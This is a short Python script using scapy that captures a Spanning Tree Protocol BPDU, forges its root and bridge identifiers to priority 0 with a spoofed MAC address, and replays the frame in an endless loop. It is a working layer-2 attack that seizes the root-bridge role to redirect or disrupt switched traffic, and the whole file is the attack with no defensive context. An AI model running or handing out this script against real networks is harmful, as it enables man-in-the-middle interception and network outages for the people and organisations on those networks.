#!/usr/bin/env python3
#Import scapy
from scapy.all import *
#Capture STP frame
bpdu = sniff(filter="ether dst 01:80:c2:00:00:00",count=1, iface="eth0")    
#Change the MAC address in the frame to the following:
bpdu[0].src="00:00:00:00:00:01"
#Set Rootid
bpdu[0].rootid=0
#Set rootmac
bpdu[0].rootmac="00:00:00:00:00:01"
#Set Bridgeid
bpdu[0].bridgeid=0  
#Set rootmac
bpdu[0].bridgemac="00:00:00:00:00:01"
#Show changed frame
bpdu[0].show()
#Loop to send multiple frames into the network:
sendp(bpdu[0], loop=1, verbose=1, iface="eth0")
